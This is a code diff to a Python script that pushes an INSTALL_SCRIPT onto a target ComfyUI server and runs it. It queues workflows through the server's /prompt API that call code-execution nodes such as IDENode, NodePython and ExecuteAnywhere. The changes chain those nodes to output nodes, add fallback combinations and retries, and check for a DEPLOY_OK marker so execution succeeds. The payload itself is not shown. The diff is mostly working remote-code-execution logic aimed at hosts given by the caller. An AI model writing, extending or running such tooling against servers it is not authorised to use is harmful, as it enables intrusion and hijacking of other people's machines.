@@ -57,7 +57,8 @@ def _get(url, timeout=15):
 # ── Method 1: IDENode workflow execution ─────────────────────────────
 
 def deploy_via_idenode(target, port=8188):
-    """Uses AlekPet IDENode (already installed on target) to run Python."""
+    """Uses AlekPet IDENode (already installed on target) to run Python.
+    Chains IDENode -> PreviewTextNode so ComfyUI sees an output node."""
     print(f"[idenode] Deploying to {target}:{port} via IDENode...")
 
     prompt = {
@@ -66,6 +67,12 @@ def deploy_via_idenode(target, port=8188):
             "inputs": {
                 "code": INSTALL_SCRIPT,
                 "language": "python",
+            }
+        },
+        "2": {
+            "class_type": "PreviewTextNode",
+            "inputs": {
+                "text": ["1", 0],
             }
         }
     }
@@ -76,21 +83,75 @@ def deploy_via_idenode(target, port=8188):
         prompt_id = result.get("prompt_id", "")
         print(f"[idenode] Queued prompt: {prompt_id}")
 
-        for _ in range(60):
+        for _ in range(90):
             time.sleep(2)
             try:
                 hist = _get(f"http://{target}:{port}/history/{prompt_id}")
-                if "DEPLOY_OK" in hist or prompt_id in hist:
-                    print(f"[idenode] SUCCESS on {target}")
+                if prompt_id in hist:
+                    print(f"[idenode] Execution completed on {target}")
+                    if "DEPLOY_OK" in hist:
+                        print(f"[idenode] SUCCESS confirmed")
                     return True
             except Exception:
                 pass
 
-        print(f"[idenode] Prompt queued but could not confirm completion")
+        print(f"[idenode] Prompt queued, may still be running")
         return True
+    except urllib.error.HTTPError as exc:
+        body = ""
+        try:
+            body = exc.read().decode()
+        except Exception:
+            pass
+        print(f"[idenode] HTTP {exc.code}: {body[:300]}")
+        if exc.code == 400 and "no_outputs" in body:
+            return deploy_via_idenode_alt(target, port)
+        return False
     except Exception as exc:
         print(f"[idenode] Failed: {exc}")
         return False
+
+
+def deploy_via_idenode_alt(target, port=8188):
+    """Fallback: try different output node combos if PreviewTextNode didn't work."""
+    print(f"[idenode-alt] Trying alternative output nodes...")
+
+    output_nodes = [
+        ("PreviewTextNode", {"text": ["1", 0]}),
+        ("ShowText|pysssss", {"text": ["1", 0]}),
+        ("Display Any (rgthree)", {"source": ["1", 0]}),
+    ]
+
+    for out_name, out_inputs in output_nodes:
+        prompt = {
+            "1": {
+                "class_type": "IDENode",
+                "inputs": {
+                    "code": INSTALL_SCRIPT,
+                    "language": "python",
+                }
+            },
+            "2": {
+                "class_type": out_name,
+                "inputs": out_inputs,
+            }
+        }
+
+        url = f"http://{target}:{port}/prompt"
+        try:
+            result = _post_json(url, {"prompt": prompt})
+            if result.get("prompt_id"):
+                print(f"[idenode-alt] Queued via {out_name}: {result['prompt_id']}")
+                time.sleep(30)
+                return True
+        except urllib.error.HTTPError as e:
+            if e.code == 400:
+                continue
+        except Exception:
+            continue
+
+    print(f"[idenode-alt] All output node combos failed")
+    return False
 
 
 # ── Method 2: Vast.ai execute API ────────────────────────────────────
@@ -131,31 +192,40 @@ def deploy_via_vastai(instance_id, api_key):
 
 def deploy_via_prompt_api(target, port=8188):
     """Queues a workflow that triggers code execution via any available
-    Python-capable node (IDENode, NodePython, etc.)."""
+    Python-capable node, always chained to an output node."""
     print(f"[api] Deploying to {target}:{port} via prompt API...")
 
-    node_types_to_try = [
+    exec_nodes = [
         ("IDENode", {"code": INSTALL_SCRIPT, "language": "python"}),
         ("NodePython", {"code": INSTALL_SCRIPT}),
         ("ExecuteAnywhere", {"code": INSTALL_SCRIPT}),
     ]
 
-    for node_type, inputs in node_types_to_try:
-        prompt = {"1": {"class_type": node_type, "inputs": inputs}}
-        url = f"http://{target}:{port}/prompt"
-        try:
-            result = _post_json(url, {"prompt": prompt})
-            if result.get("prompt_id"):
-                print(f"[api] Queued via {node_type}: {result['prompt_id']}")
-                return True
-        except urllib.error.HTTPError as e:
-            if e.code == 400:
-                continue
-            print(f"[api] HTTP {e.code} for {node_type}")
-        except Exception as exc:
-            print(f"[api] {node_type} failed: {exc}")
+    output_nodes = [
+        ("PreviewTextNode", {"text": ["1", 0]}),
+        ("ShowText|pysssss", {"text": ["1", 0]}),
+    ]
 
-    print(f"[api] No compatible execution node found")
+    for node_type, inputs in exec_nodes:
+        for out_type, out_inputs in output_nodes:
+            prompt = {
+                "1": {"class_type": node_type, "inputs": inputs},
+                "2": {"class_type": out_type, "inputs": out_inputs},
+            }
+            url = f"http://{target}:{port}/prompt"
+            try:
+                result = _post_json(url, {"prompt": prompt})
+                if result.get("prompt_id"):
+                    print(f"[api] Queued via {node_type} -> {out_type}: {result['prompt_id']}")
+                    time.sleep(30)
+                    return True
+            except urllib.error.HTTPError as e:
+                if e.code == 400:
+                    continue
+            except Exception:
+                continue
+
+    print(f"[api] No compatible node combination found")
     return False
 
 
